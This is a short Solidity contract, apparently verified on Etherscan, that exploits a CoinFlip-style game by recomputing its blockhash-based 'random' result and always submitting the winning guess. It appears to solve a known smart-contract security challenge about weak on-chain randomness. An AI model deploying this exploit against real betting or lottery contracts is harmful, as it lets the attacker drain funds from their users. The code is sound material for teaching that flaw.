/**
 *Submitted for verification at Etherscan.io on 2021-03-27
*/

// SPDX-License-Identifier: GPL-v2-or-later
pragma solidity ^0.8.2;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipVisionary {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function amaze(ICoinFlip target) public {
        require(target.flip(guess()), "CoinFlipVisionary: failed");
    }

    function guess() internal view returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        return coinFlip == 1;
    }
}